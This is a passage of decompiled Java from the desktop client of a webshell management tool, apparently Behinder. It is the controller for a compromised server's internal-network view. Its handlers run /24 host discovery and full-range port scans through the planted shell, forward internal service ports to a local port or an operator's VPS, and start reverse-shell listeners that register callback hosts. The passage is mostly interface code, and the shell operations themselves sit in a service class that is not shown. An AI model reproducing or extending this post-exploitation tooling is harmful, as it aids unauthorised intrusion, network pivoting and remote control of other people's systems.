      new Menu("GetShell");
      bShellMenu.getItems().addAll(new MenuItem[]{manualAddBtn});
      cm.getItems().addAll(new MenuItem[]{openBtn, scanServiceBtn, bShellMenu});
      Menu pluginMenu = new Menu("插件");
      this.initPluginMenu(pluginMenu);
      cm.getItems().add(pluginMenu);
      MenuItem delBtn = new MenuItem("删除");
      delBtn.setOnAction((event) -> {
         String ip = cm.getUserData().toString();

         try {
            this.delHost(ip);
            this.statusLabel.setText(String.format("主机%s删除成功：", ip));
         } catch (Exception var5) {
            this.statusLabel.setText(String.format("主机%s删除失败", ip));
         }

      });
      cm.getItems().add(delBtn);
      MenuItem commentBtn = new MenuItem("备注");
      commentBtn.setOnAction((event) -> {
         String ip = (String)cm.getUserData();
         Alert alert = Utils.getAlert(AlertType.INFORMATION);
         alert.setTitle("请输入主机备注信息");
         alert.setHeaderText("请输入备注信息");
         TextArea commentText = new TextArea();
         GridPane vpsInfoPane = new GridPane();
         vpsInfoPane.setMaxWidth(Double.MAX_VALUE);
         vpsInfoPane.add(commentText, 0, 0);
         alert.getDialogPane().setContent(vpsInfoPane);
         Optional result = alert.showAndWait();
         if (result.isPresent()) {
            String comment = commentText.getText().trim();
            if (result.get() == ButtonType.OK) {
               try {
                  this.hostDao.updateComment(ip, comment);
                  this.statusLabel.setText(String.format("主机%s备注已更新。", ip));
               } catch (Exception var10) {
                  this.statusLabel.setText(String.format("主机备注更新失败：%s", var10.getMessage()));
                  var10.printStackTrace();
               }
            }
         }

      });
      cm.getItems().add(commentBtn);
      this.hostContextMenu = cm;
      this.addHostBtn.setOnAction((event) -> {
         String IPAddress = Utils.showInputBox("输入", "请输入主机信息", "IP地址：", "");
         if (IPAddress != null) {
            if (Utils.checkIP(IPAddress)) {
               try {
                  this.addHost(IPAddress);
               } catch (Exception var4) {
                  Utils.showErrorMessage("提示", "添加失败" + var4.getMessage());
                  var4.printStackTrace();
               }
            } else {
               Utils.showErrorMessage("提示", "IP格式错误。");
            }

         }
      });
      this.doScanBtn.setOnAction((event) -> {
         Alert alert = new Alert(AlertType.INFORMATION);
         alert.setTitle("主动扫描");
         alert.setHeaderText("请输入扫描IP范围：");
         Label label = new Label("IP地址：");
         TextArea ipaddrText = new TextArea();
         String range = "";
         String[] var6 = this.getLocalIpArr();
         int var7 = var6.length;

         for(int var8 = 0; var8 < var7; ++var8) {
            String ip = var6[var8];
            String start = ip.substring(0, ip.lastIndexOf(".")) + ".1";
            String stop = ip.substring(0, ip.lastIndexOf(".")) + ".254";
            range = range + start + "-" + stop + ",\n";
         }

         range = range.endsWith(",") ? range.substring(0, range.length() - 1) : range;
         ipaddrText.setText(range);
         GridPane hostInfoPane = new GridPane();
         hostInfoPane.setMaxWidth(Double.MAX_VALUE);
         hostInfoPane.add(label, 0, 0);
         hostInfoPane.add(ipaddrText, 1, 0);
         alert.getDialogPane().setContent(hostInfoPane);
         Optional result = alert.showAndWait();
         if (result.isPresent()) {
            if (result.get() == ButtonType.OK) {
               try {
                  String ips = ipaddrText.getText();
                  ips = ips.replace("\n", ",").replace(",,", ",");
                  this.scanAliveHosts(ips, false);
               } catch (Exception var12) {
                  var12.printStackTrace();
               }
            }

         }
      });
      this.returnListBtn.setOnAction((event) -> {
         this.switchAssetPane("list");
      });
      this.fastServiceScanBtn.setOnAction((event) -> {
         String ipRange = this.getLocalIpRange(false);
         Optional result = Utils.showConfirmMessage("提示", "即将对下列IP列表进行全端口扫描：\n" + this.getLocalIpRange(true));
         if (result.isPresent() && result.get() == ButtonType.OK) {
            this.scanService(ipRange, "1-65535", this.defautThreadSize);
         }

      });
      this.custServiceScanBtn.setOnAction((event) -> {
         this.showCustomServiceScan();
      });
      this.filterTxt.setOnKeyPressed((keyEvent) -> {
         if (keyEvent.getCode() == KeyCode.ENTER) {
            String keyword = this.filterTxt.getText();
            String type = "service";
            if (this.hostViewRadio.isSelected()) {
               type = "host";
            }

            try {
               this.filter(type, keyword);
            } catch (Exception var5) {
               var5.printStackTrace();
            }
         }

      });
   }

   private void initServiceDetailContextMenu() {
      ContextMenu cm = new ContextMenu();
      MenuItem reScanBtn = new MenuItem("重扫该端口");
      reScanBtn.setOnAction((event) -> {
         System.out.println(event.getSource());
         System.out.println(event.getTarget());
         Service service = (Service)cm.getUserData();
         Host host = null;

         try {
            host = this.hostDao.findHostById(service.getHostId());
         } catch (Exception var6) {
            var6.printStackTrace();
         }

         String ip = host.getIp();
         this.scanService(ip, service.getPort() + "", "1");
      });
      cm.getItems().add(reScanBtn);
      MenuItem localPortMapBtn = new MenuItem("本地");
      MenuItem remoteortMapBtn = new MenuItem("VPS...");
      localPortMapBtn.setOnAction((event) -> {
         Service service = (Service)cm.getUserData();
         Host host = null;

         try {
            host = this.hostDao.findHostById(service.getHostId());
         } catch (Exception var13) {
            var13.printStackTrace();
         }

         String ip = host.getIp();
         String targetProt = service.getPort() + "";
         String remoteIp = "0.0.0.0";
         String remotePort = Utils.showInputBox("输入", "请指定需要映射到本地的端口号", "端口：", targetProt);
         if (remotePort != null) {
            this.tunnelService.createLocalPortMap(remoteIp, remotePort, ip, targetProt);
            Tunnel tunnel = new Tunnel();
            tunnel.setTargetIp(ip);
            tunnel.setTargetPort(targetProt);
            tunnel.setRemoteIp(remoteIp);
            tunnel.setRemotePort(targetProt);
            tunnel.setShellId(this.shellID);
            tunnel.setStatus(Constants.TUNNEL_STATUS_ALIVE);

            try {
               this.addTunnel(tunnel);
            } catch (Exception var12) {
               this.statusLabel.setText("隧道建立成功，入库失败。");
            }

         }
      });
      Menu portMapMenu = new Menu("映射至");
      portMapMenu.getItems().addAll(new MenuItem[]{localPortMapBtn, remoteortMapBtn});
      cm.getItems().add(portMapMenu);
      remoteortMapBtn.setOnAction((event) -> {
         Alert alert = new Alert(AlertType.INFORMATION);
         alert.setTitle("请输入VPS信息");
         alert.setHeaderText("请输入主机信息");
         TextField vpsIPText = new TextField();
         TextField vpsPortText = new TextField();
         GridPane vpsInfoPane = new GridPane();
         vpsInfoPane.setMaxWidth(Double.MAX_VALUE);
         vpsInfoPane.add(new Label("IP地址："), 0, 0);
         vpsInfoPane.add(vpsIPText, 1, 0);
         vpsInfoPane.add(new Label("端口："), 0, 1);
         vpsInfoPane.add(vpsPortText, 1, 1);
         alert.getDialogPane().setContent(vpsInfoPane);
         Optional result = alert.showAndWait();
         if (result.isPresent()) {
            String vpsIp = vpsIPText.getText().trim();
            String vpsPort = vpsPortText.getText().trim();
            if (!Utils.checkIP(vpsIp) || !Utils.checkPort(vpsPort)) {
               return;
            }

            Service service = (Service)cm.getUserData();
            Host host = null;

            try {
               host = this.hostDao.findHostById(service.getHostId());
            } catch (Exception var16) {
               var16.printStackTrace();
            }

            String ip = host.getIp();
            if (result.get() == ButtonType.OK) {
               try {
                  JSONObject resultObj = this.currentShellService.createRemotePortMap(ip, service.getPort() + "", vpsIp, vpsPort);
                  String status = resultObj.getString("status");
                  if (status.equals("success")) {
                     this.statusLabel.setText("服务端口:" + service.getPort() + "映射成功，请连接VPS:" + vpsIp + ":" + vpsPort);
                  } else {
                     this.statusLabel.setText("服务端口:" + service.getPort() + "映射失败。");
                  }
               } catch (Exception var15) {
                  this.statusLabel.setText("服务端口:" + service.getPort() + "映射失败：" + var15.getMessage());
                  var15.printStackTrace();
               }
            }
         }

      });
      new MenuItem("远程桌面");
      MenuItem delBtn = new MenuItem("删除");
      delBtn.setOnAction((event) -> {
      });
      cm.getItems().add(delBtn);
      this.serviceContextMenu = cm;
   }

   private void initMainContextMenu() {
      ContextMenu cm = new ContextMenu();
      MenuItem scanHostBtn = new MenuItem("主机发现（C段）");
      scanHostBtn.setOnAction((event) -> {
         if (this.hostFlowPane.getChildren().size() > 1) {
            Optional result = Utils.showConfirmMessage("确认", "该操作会清空现有主机列表并重新扫描，是否继续？");
            if (!result.isPresent()) {
               return;
            }

            if (result.get() == ButtonType.CANCEL) {
               return;
            }
         }

         String range = "";
         String[] var3 = this.getLocalIpArr();
         int var4 = var3.length;

         for(int var5 = 0; var5 < var4; ++var5) {
            String ip = var3[var5];
            String start = ip.substring(0, ip.lastIndexOf(".")) + ".1";
            String stop = ip.substring(0, ip.lastIndexOf(".")) + ".254";
            range = range + start + "-" + stop + ",";
         }

         range = range.endsWith(",") ? range.substring(0, range.length() - 1) : range;
         this.scanAliveHosts(range, true);
      });
      MenuItem scanServiceBtn = new MenuItem("服务识别");
      scanServiceBtn.setOnAction((event) -> {
         StringBuilder sb = new StringBuilder();

         try {
            List hostList = this.hostDao.findHostByShellId(this.shellID);
            Iterator var4 = hostList.iterator();

            while(var4.hasNext()) {
               Host host = (Host)var4.next();
               sb.append(host.getIp() + ",");
            }
         } catch (Exception var6) {
            var6.printStackTrace();
         }

         String ipList = sb.toString();
         String portList = "1-65535";
         this.scanService(ipList, portList, this.defautThreadSize);
      });
      MenuItem refreshBtn = new MenuItem("刷新");
      refreshBtn.setOnAction((event) -> {
         try {
            this.loadHosts();
         } catch (Exception var3) {
            var3.printStackTrace();
         }

      });
      cm.getItems().addAll(new MenuItem[]{scanHostBtn, scanServiceBtn, refreshBtn});
      this.mainContextMenu = cm;
      this.hostFlowPane.setOnContextMenuRequested((event) -> {
         this.mainContextMenu.show(this.hostFlowPane.getScene().getWindow(), event.getScreenX() + 5.0, event.getScreenY() + 5.0);
      });
   }

   private void initBShellBoxContextMenu() {
      ContextMenu cm = new ContextMenu();
      MenuItem openConsoleBtn = new MenuItem("打开BShell（命令行）");
      openConsoleBtn.setStyle("-fx-font-weight:bold");
      openConsoleBtn.setOnAction((event) -> {
         try {
            BShell bShell = (BShell)this.bShellContextMenu.getUserData();
            if (bShell == null) {
               return;
            }

            this.switchBShellPane("console");
            this.openBShellConsole(bShell);
         } catch (Exception var3) {
            var3.printStackTrace();
         }

      });
      MenuItem openGUIBtn = new MenuItem("打开BShell（GUI）");
      openGUIBtn.setOnAction((event) -> {
         try {
            BShell bShell = (BShell)this.bShellContextMenu.getUserData();
            if (bShell == null) {
               return;
            }

            this.switchBShellPane("gui");
            this.openBShellGui(bShell);
         } catch (Exception var3) {
            var3.printStackTrace();
         }

      });
      MenuItem delBShellBtn = new MenuItem("删除BShell");
      delBShellBtn.setOnAction((event) -> {
         BShell bShell = (BShell)this.bShellContextMenu.getUserData();
         if (bShell != null) {
            try {
               this.bShellDao.deleteById(bShell.getId());
               this.loadBShellList();
               this.statusLabel.setText("BShell删除成功。");
               Runnable runner = () -> {
                  String target = (new JSONObject(bShell.getBody())).getString("target");

                  try {
                     this.currentShellService.closeBShell(target, bShell.getType() + "");
                  } catch (Exception var4) {
                     var4.printStackTrace();
                  }

               };
               Thread worker = new Thread(runner);
               worker.start();
               this.workList.add(worker);
            } catch (Exception var5) {
               this.statusLabel.setText("BShell删除失败。");
               var5.printStackTrace();
            }

         }
      });
      cm.getItems().addAll(new MenuItem[]{openConsoleBtn, openGUIBtn, delBShellBtn});
      cm.getItems().add(new SeparatorMenuItem());
      MenuItem addBtn = new MenuItem("新增BShell...");
      addBtn.setOnAction((event) -> {
         this.showAddBShellPane("");
      });
      MenuItem startReverseBtn = new MenuItem("开启反向监听");
      startReverseBtn.setOnAction((event) -> {
         if (this.waitReverse) {
            Utils.showInfoMessage("提示", "当前已经开启反向监听，无需重复开启。");
         } else {
            Runnable runner = () -> {
               try {
                  JSONObject responseObj = this.currentShellService.listenBShell("");
                  String status = responseObj.getString("status");
                  String msg = responseObj.getString("msg");
                  if (status.equals("success")) {
                     this.listenPort = msg;
                     Platform.runLater(() -> {
                        this.addBShellReverseTemplate(this.listenPort);
                     });
                     System.out.println(responseObj);

                     for(this.waitReverse = true; this.waitReverse; Thread.sleep(10000L)) {
                        responseObj = this.currentShellService.listReverseBShell();
                        System.out.println(responseObj);
                        status = responseObj.getString("status");
                        msg = responseObj.getString("msg");
                        if (status.equals("success")) {
                           JSONArray reversBShellArr = new JSONArray(msg);

                           for(int i = 0; i < reversBShellArr.length(); ++i) {
                              Platform.runLater(() -> {
                                 this.clearReverseBShellBox();
                              });
                              JSONObject bShellObj = reversBShellArr.getJSONObject(i);
                              bShellObj = Utils.DecodeJsonObj(bShellObj);
                              String target = bShellObj.getString("target");
                              String ip = target.split(":")[0];
                              Host host = this.hostDao.findHostByShellIdAndIp(this.shellID, ip);
                              if (host == null) {
                                 host = new Host();
                                 host.setShellId(this.shellID);
                                 host.setIp(ip);
                                 host.setAddTime(Utils.getCurrentDate());
                                 this.hostDao.addEntity(host);
                                 host = this.hostDao.findHostByShellIdAndIp(this.shellID, ip);
                              }

                              System.out.println(bShellObj);
                              BShell bShell = new BShell();
                              bShellObj.put("type", "native");
                              bShellObj.put("listenPort", this.listenPort);
                              bShell.setName(target);
                              bShell.setBody(bShellObj.toString());
                              bShell.setType(Constants.BSHELL_TYPE_TCP_REVERSE);
                              bShell.setHostId(host.getId());
                              Platform.runLater(() -> {
                                 try {
                                    this.addBShellBox(bShell);
                                 } catch (Exception var3) {
                                    var3.printStackTrace();
                                 }

                              });

                              try {
                                 this.bShellDao.addEntity(bShell);
                              } catch (AlreadyExistException var12) {
                              }
                           }
                        }
                     }
                  } else {
                     final String finalmsg = msg;
                     Platform.runLater(() -> {
                        this.statusLabel.setText("反向监听开启失败：" + finalmsg);
                     });
                  }
               } catch (Exception var13) {
                  var13.printStackTrace();
               }

            };
            Thread worker = new Thread(runner);
            worker.start();
            this.workList.add(worker);
         }
      });
      MenuItem refreshBtn = new MenuItem("刷新列表");
      refreshBtn.setOnAction((event) -> {
         this.loadBShellList();

         try {
            JSONObject responseObj = this.currentShellService.listBShell();
            System.out.println(responseObj.get("msg"));
            JSONArray bShellArr = new JSONArray(responseObj.getString("msg"));

            for(int i = 0; i < bShellArr.length(); ++i) {
               JSONObject bShellObj = bShellArr.getJSONObject(i);
               bShellObj = Utils.DecodeJsonObj(bShellObj);
               BShell bShell = new BShell();
               bShell.setType(Constants.BSHELL_TYPE_TCP_REVERSE);
               bShell.setStatus(Constants.SHELL_STATUS_ALIVE);
               JSONObject bodyObj = new JSONObject();
               String target = bShellObj.getString("target");
               String targetIp = target.split(":")[0];
               bodyObj.put("type", "native");
               bodyObj.put("target", target);
               bShell.setBody(bodyObj.toString());

               try {
                  Host childHost = this.hostDao.findHostByShellIdAndIp(this.shellID, targetIp);
                  if (childHost == null) {
                     childHost = new Host();
                     childHost.setIp(targetIp);
                     childHost.setShellId(this.shellID);
                     childHost.setAddTime(Utils.getCurrentDate());
                     childHost.setComment("来源：反弹BShell");
                     this.hostDao.addEntity(childHost);
                     this.addHostBox(targetIp);
                     childHost = this.hostDao.findHostByShellIdAndIp(this.shellID, targetIp);
                  }

                  bShell.setHostId(childHost.getId());
               } catch (Exception var11) {
               }

               this.addBShellBox(bShell);
            }
         } catch (Exception var12) {
            var12.printStackTrace();
         }

      });
      MenuItem checkAliveBtn = new MenuItem("监测存活状态");
      checkAliveBtn.setOnAction((event) -> {
         this.loadBShellList();

         try {
            JSONObject responseObj = this.currentShellService.listBShell();
            JSONArray bShellArr = new JSONArray(responseObj.getString("msg"));

            for(int i = 0; i < bShellArr.length(); ++i) {
               JSONObject bShellObj = bShellArr.getJSONObject(i);
               bShellObj = Utils.DecodeJsonObj(bShellObj);
            }
         } catch (Exception var6) {
            var6.printStackTrace();
         }

      });
      new MenuItem("清理失效BShell");
      cm.getItems().addAll(new MenuItem[]{addBtn, startReverseBtn, refreshBtn});
      this.bShellContextMenu = cm;
      this.bShellFlowPane.setOnContextMenuRequested((event) -> {
         this.bShellContextMenu.show(this.bShellFlowPane.getScene().getWindow(), event.getScreenX() + 5.0, event.getScreenY() + 5.0);
         event.consume();
      });
      new ContextMenu();
      this.bShellScrollPane.setOnContextMenuRequested((event) -> {
         this.bShellContextMenu.show(this.bShellFlowPane.getScene().getWindow(), event.getScreenX() + 5.0, event.getScreenY() + 5.0);
         event.consume();
      });
   }

   private void clearReverseBShellBox() {
      Set nodeSet = new HashSet();
      Iterator var2 = this.bShellFlowPane.getChildren().iterator();

      while(true) {
         Node box;
         BShell bShell;
         do {
            do {
               if (!var2.hasNext()) {
                  this.bShellFlowPane.getChildren().removeAll(nodeSet);
                  return;
               }

               box = (Node)var2.next();
               bShell = (BShell)box.getUserData();
            } while(bShell == null);
         } while(bShell.getType() != Constants.BSHELL_TYPE_TCP_REVERSE && bShell.getType() != Constants.BSHELL_TYPE_HTTP_REVERSE);

         nodeSet.add(box);
      }
   }

   private void addTunnel(Tunnel tunnel) throws Exception {
      try {
         this.tunnelDao.addEntity(tunnel);
      } catch (AlreadyExistException var3) {
      }

      this.addTunnelBox(tunnel);
   }

   private void addTunnelBox(Tunnel tunnel) throws Exception {
      String type = "";
      switch (tunnel.getType()) {
         case 0:
            type = "正向（TCP）";
            break;
         case 1:
            type = "正向（HTTP）";
            break;
         case 2:
            type = "反向（TCP）";
            break;
         case 3:
            type = "反向（HTTP）";
      }

      String targetIp = tunnel.getTargetIp();
      String targetPort = tunnel.getTargetPort();
      String remoteIp = tunnel.getRemoteIp();
      String remotePort = tunnel.getRemotePort();
      VBox box = new VBox();
      Label targetIpLabel = new Label("【目标IP】：" + targetIp);
      targetIpLabel.setStyle("-fx-text-fill:#00ff00");
      Label targetPortLabel = new Label("【目标端口】：" + targetPort);
      targetPortLabel.setStyle("-fx-text-fill:#00ff00");
      Label remoteIpLabel = new Label("【本地IP】：" + remoteIp);
      remoteIpLabel.setStyle("-fx-text-fill:#00ff00");
      Label remotePortLabel = new Label("【本地端口】：" + remotePort);
      remotePortLabel.setStyle("-fx-text-fill:#00ff00");
      Label statusLabel = new Label("【状态】：" + (tunnel.getStatus() == Constants.TUNNEL_STATUS_ALIVE ? "已打开" : "已关闭"));
      statusLabel.setStyle("-fx-text-fill:#00ff00");
      box.getChildren().addAll(new Node[]{targetIpLabel, targetPortLabel, remoteIpLabel, remotePortLabel, statusLabel});
      box.setStyle("-fx-border-width: 1; -fx-border-insets: 5; -fx-border-style: dashed; -fx-border-color: green;");
      box.setPadding(new Insets(5.0));
      box.setPrefWidth(300.0);
      box.setUserData(tunnel);
      box.setSpacing(10.0);
      VBox.setMargin(box, new Insets(10.0, 0.0, 0.0, 0.0));
      box.hoverProperty().addListener((observable, oldValue, newValue) -> {
         if (newValue) {
            this.setBoxBackground(box);
         } else {
            this.removeBoxBackground(box);
         }

      });
      box.setOnContextMenuRequested((event) -> {
         this.tunnelItemContextMenu.setUserData(tunnel);
         MenuItem toggleItem = (MenuItem)this.tunnelItemContextMenu.getItems().get(0);
         if (tunnel.getStatus() == Constants.TUNNEL_STATUS_ALIVE) {
            toggleItem.setText("关闭隧道");
            toggleItem.setUserData("close");
         } else {
            toggleItem.setText("打开隧道");
            toggleItem.setUserData("open");
         }

         this.tunnelItemContextMenu.show(this.tunnelFlowPane.getScene().getWindow(), event.getScreenX() + 5.0, event.getScreenY() + 5.0);
         event.consume();
      });
      this.tunnelFlowPane.getChildren().add(box);
   }

   private void updateTunnelBox(Tunnel tunnel) {
      Iterator var2 = this.tunnelFlowPane.getChildren().iterator();

      Node box;
      do {
         if (!var2.hasNext()) {
            return;
         }

         box = (Node)var2.next();
      } while(box.getUserData() != tunnel);

      Label targetIpLabel = (Label)((VBox)box).getChildren().get(0);
      targetIpLabel.setText("【目标IP】：" + tunnel.getTargetIp());
      Label targetPortLabel = (Label)((VBox)box).getChildren().get(1);
      targetPortLabel.setText("【目标端口】：" + tunnel.getTargetPort());
      Label remoteIpLabel = (Label)((VBox)box).getChildren().get(2);
      remoteIpLabel.setText("【本地IP】：" + tunnel.getRemoteIp());
      Label remotePortLabel = (Label)((VBox)box).getChildren().get(3);
      remotePortLabel.setText("【本地端口】：" + tunnel.getRemotePort());
      remotePortLabel.setStyle("-fx-text-fill:#00ff00");
      Label statusLabel = (Label)((VBox)box).getChildren().get(4);
      statusLabel.setText("【状态】：" + (tunnel.getStatus() == Constants.BSHELL_STATUS_ALIVE ? "已打开" : "已关闭"));
   }

   private void addBShellBox(BShell bShell) throws Exception {
      Host host = this.hostDao.findHostById(bShell.getHostId());
      String type = "";
      switch (bShell.getType()) {
         case 0:
            type = "正向（TCP）";
            break;
         case 1:
            type = "正向（HTTP）";
            break;
         case 2:
            type = "反向（TCP）";
            break;
         case 3:
            type = "反向（HTTP）";
      }

      VBox box = new VBox();
      Label portLabel = new Label("【类型】：" + type);
      portLabel.setStyle("-fx-text-fill:#00ff00");
      Label serviceLabel = new Label("【主机】：" + host.getIp());
      serviceLabel.setStyle("-fx-text-fill:#00ff00");
      Label versionLabel = new Label("【详情】：" + bShell.getBody());
      versionLabel.setStyle("-fx-text-fill:#00ff00");
      versionLabel.setWrapText(true);
      Label bannerLabel = new Label("【状态】：" + (bShell.getStatus() == Constants.BSHELL_STATUS_ALIVE ? "可用" : "失效"));
      bannerLabel.setStyle("-fx-text-fill:#00ff00");
      box.getChildren().addAll(new Node[]{portLabel, serviceLabel, versionLabel});
      box.setStyle("-fx-border-width: 1; -fx-border-insets: 5; -fx-border-style: dashed; -fx-border-color: green;");
      box.setPadding(new Insets(5.0));
      box.setPrefWidth(300.0);
      box.setUserData(bShell);
      box.setSpacing(10.0);
      VBox.setMargin(box, new Insets(10.0, 0.0, 0.0, 0.0));
      box.hoverProperty().addListener((observable, oldValue, newValue) -> {
         if (newValue) {
            this.setBoxBackground(box);
         } else {
            this.removeBoxBackground(box);
         }

      });
      box.setOnContextMenuRequested((event) -> {
         this.bShellContextMenu.setUserData(bShell);
         this.bShellContextMenu.show(this.bShellFlowPane.getScene().getWindow(), event.getScreenX() + 5.0, event.getScreenY() + 5.0);
      });
      this.bShellFlowPane.getChildren().add(box);
   }

   private void delBShellReverseTemplate() {
      Iterator var1 = this.bShellFlowPane.getChildren().iterator();

      while(var1.hasNext()) {
         Node box = (Node)var1.next();
         if (box.getUserData() == null) {
            this.bShellFlowPane.getChildren().remove(box);
            break;
         }
      }

   }

   private void addBShellReverseTemplate(String listenPort) {
      this.delBShellReverseTemplate();
      VBox box = new VBox();
      Label portLabel = new Label("【类型】：反向");
      portLabel.setStyle("-fx-text-fill:#00ff00");
      Label serviceLabel = new Label("【主机】：等待连接……");
      serviceLabel.setStyle("-fx-text-fill:#00ff00");
      Label versionLabel = new Label("【详情】：正在监听服务器端口：" + listenPort + "……");
      versionLabel.setStyle("-fx-text-fill:#00ff00");
      versionLabel.setWrapText(true);
      Label bannerLabel = new Label("【状态】：等待连接……");
      bannerLabel.setStyle("-fx-text-fill:#00ff00");
      box.getChildren().addAll(new Node[]{portLabel, serviceLabel, versionLabel, bannerLabel});
      box.setStyle("-fx-border-width: 1; -fx-border-insets: 5; -fx-border-style: dashed; -fx-border-color: green;");
      box.setPadding(new Insets(5.0));
      box.setPrefWidth(300.0);
      box.setSpacing(10.0);
      VBox.setMargin(box, new Insets(10.0, 0.0, 0.0, 0.0));
      box.hoverProperty().addListener((observable, oldValue, newValue) -> {
         if (newValue) {
            this.setBoxBackground(box);
         } else {
            this.removeBoxBackground(box);
         }

      });
      ContextMenu contextMenu = new ContextMenu();
      MenuItem stopListen = new MenuItem("停止反向监听");
      stopListen.setOnAction((event) -> {
         this.waitReverse = false;
         Runnable runner = () -> {
            try {
               this.currentShellService.stopReverseBShell();
               Platform.runLater(() -> {
                  this.delBShellReverseTemplate();
                  this.statusLabel.setText("服务侧反向BShell监听端口已关闭。");
               });
            } catch (Exception var2) {
               Platform.runLater(() -> {
                  this.statusLabel.setText("请求失败：" + var2.getMessage());
               });
            }

         };
         Thread worker = new Thread(runner);
         worker.start();
         this.workList.add(worker);
      });
      MenuItem reListen = new MenuItem("换端口监听");
      reListen.setOnAction((event) -> {
         String newlistenPort = Utils.showInputBox("请输入", "输入需要重新监听的端口号", "端口：", "");
         if (newlistenPort != null) {
            try {
               this.currentShellService.stopReverseBShell();
               JSONObject responseObj = this.currentShellService.listenBShell(newlistenPort);
               String status = responseObj.getString("status");
               if (status.equals("success")) {
                  this.addBShellReverseTemplate(newlistenPort);
               } else {
                  this.statusLabel.setText("换端口监听失败");
               }
            } catch (Exception var5) {
               var5.printStackTrace();
               this.statusLabel.setText("换端口监听失败:" + var5.getMessage());
            }
         }

      });
      contextMenu.getItems().addAll(new MenuItem[]{stopListen, reListen});
      box.setOnContextMenuRequested((event) -> {
         contextMenu.show(this.bShellFlowPane.getScene().getWindow(), event.getScreenX() + 5.0, event.getScreenY() + 5.0);
         event.consume();
      });
      this.bShellFlowPane.getChildren().add(0, box);
   }

   private void loadBShellList() {
      this.bShellFlowPane.getChildren().clear();

      try {
         List bShellList = this.bShellDao.findBShellByShellId(this.shellID);
         Iterator var2 = bShellList.iterator();

         while(var2.hasNext()) {
            BShell bShell = (BShell)var2.next();
            this.addBShellBox(bShell);
         }
      } catch (Exception var4) {
         var4.printStackTrace();
      }

      if (this.waitReverse) {
         this.addBShellReverseTemplate(this.listenPort);
      }

   }

   private void initHostDetail() throws Exception {
      VBox box = new VBox();
      Tooltip tooltip = new Tooltip("双击该区域可快速返回列表");
      Tooltip.install(box, tooltip);
      ImageView hostItem = new ImageView();
      Image hostIcon = new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/host.png")));
      hostItem.setImage(hostIcon);
      hostItem.setFitHeight(30.0);
      hostItem.setPreserveRatio(true);
      Label hostIP = new Label();
      hostIP.setStyle("-fx-text-fill:#00ff00");
      Label hostComment = new Label();
      hostComment.setStyle("-fx-text-fill:#00ff00");
      Label hostOS = new Label("OS：Linux");
      hostOS.setStyle("-fx-text-fill:#00ff00");
      box.getChildren().addAll(new Node[]{hostItem, hostIP, hostComment, hostOS});
      box.setStyle("-fx-border-width: 1; -fx-border-insets: 5; -fx-border-style: dashed; -fx-border-color: green;");
      box.setPadding(new Insets(5.0));
      box.setAlignment(Pos.CENTER);
      box.setOnMouseClicked((event) -> {
         if (event.getClickCount() == 2) {
            event.consume();

            try {
               this.switchAssetPane("list");
            } catch (Exception var3) {
               var3.printStackTrace();
            }
         }

      });
      GridPane.setMargin(box, new Insets(10.0, 0.0, 0.0, 0.0));
      VBox portViewBox = new VBox();
      ScrollPane portViewScrollContainer = new ScrollPane();
      portViewScrollContainer.setContent(portViewBox);
      portViewScrollContainer.setFitToWidth(true);
      portViewScrollContainer.setFitToHeight(true);
      portViewScrollContainer.setStyle("-fx-border-width: 1; -fx-border-insets: 5; -fx-border-style: dashed; -fx-border-color: green;-fx-background-color:black;");
      portViewScrollContainer.setOpacity(100.0);
      portViewBox.setStyle("-fx-background-color:black;");
      portViewBox.setPadding(new Insets(5.0));
      portViewBox.setAlignment(Pos.CENTER);
      GridPane.setMargin(portViewBox, new Insets(10.0, 0.0, 0.0, 0.0));
      VBox nameViewBox = new VBox();
      nameViewBox.setStyle("-fx-border-width: 1; -fx-border-insets: 5; -fx-border-style: dashed; -fx-border-color: green;");
      nameViewBox.setPadding(new Insets(5.0));
      nameViewBox.setAlignment(Pos.CENTER);
      GridPane.setMargin(nameViewBox, new Insets(10.0, 0.0, 0.0, 0.0));
      this.hostDetailGridPane.setOpacity(0.0);
      this.hostDetailGridPane.add(box, 0, 0);
      this.hostDetailGridPane.add(portViewScrollContainer, 0, 1);
   }

   private void fillHostDetail(Host host) {
      VBox hostDetailBox = (VBox)this.hostDetailGridPane.getChildren().get(2);
      Label hostIP = (Label)hostDetailBox.getChildren().get(1);
      hostIP.setText("IP地址：" + host.getIp());
      Label hostComment = (Label)hostDetailBox.getChildren().get(2);
      hostComment.setText("备注：" + host.getComment());
      Label hostOS = (Label)hostDetailBox.getChildren().get(3);
      hostOS.setText(host.getOs());
   }

   private void initPluginMenu(Menu menu) {
      JSONArray pluginList = this.loadPluginList();

      for(int i = 0; i < pluginList.length(); ++i) {
         JSONObject pluginGroupObj = pluginList.getJSONObject(i);
         JSONArray pluginGroupArr = pluginGroupObj.getJSONArray("children");
         Menu groupMenu = new Menu(pluginGroupObj.getString("name"));
         menu.getItems().add(groupMenu);

         for(int j = 0; j < pluginGroupArr.length(); ++j) {
            Plugin plugin = (Plugin)pluginGroupArr.get(j);
            MenuItem menuItem = new MenuItem(plugin.getName());
            menuItem.setOnAction((event) -> {
               TabPane tabPane = (TabPane)((GridPane)this.statusLabel.getParent().getParent()).getChildren().get(2);
               tabPane.getSelectionModel().selectNext();
               String IPAddress = (String)menu.getParentPopup().getUserData();
               Host host = new Host();
               host.setIp(IPAddress);
               this.pluginViewController.loadPluginFromHost(plugin, host);
            });
            groupMenu.getItems().add(menuItem);
         }
      }

   }

   private boolean hostBoxExists(String ip) {
      Iterator var2 = this.hostFlowPane.getChildren().iterator();

      Label ipLabel;
      do {
         if (!var2.hasNext()) {
            return false;
         }

         Node box = (Node)var2.next();
         ipLabel = (Label)((VBox)box).getChildren().get(1);
      } while(!ipLabel.getText().trim().equals(ip.trim()));

      return true;
   }

   private boolean serviceBoxExists(Service service) {
      Iterator var2 = this.hostFlowPane.getChildren().iterator();

      Node box;
      do {
         if (!var2.hasNext()) {
            return false;
         }

         box = (Node)var2.next();
      } while(box.getUserData() != service);

      return true;
   }

   private Node getHostBoxByIp(String ip) {
      Iterator var2 = this.hostFlowPane.getChildren().iterator();

      Node box;
      Label ipLabel;
      do {
         if (!var2.hasNext()) {
            return null;
         }

         box = (Node)var2.next();
         ipLabel = (Label)((VBox)box).getChildren().get(1);
      } while(!ipLabel.getText().trim().equals(ip.trim()));

      return box;
   }

   private void addService(String ip, String port, String name, String version, String banner) throws Exception {
      Service service = new Service();
      service.setName(name);
      service.setPort(Integer.parseInt(port));
      service.setVersion(version);
      service.setBanner(banner);
      service.setAddTime(Utils.getCurrentDate());
      service.setComment(ip);
      Host host = this.hostDao.findHostByShellIdAndIp(this.shellID, ip);
      if (host == null) {
         host = new Host();
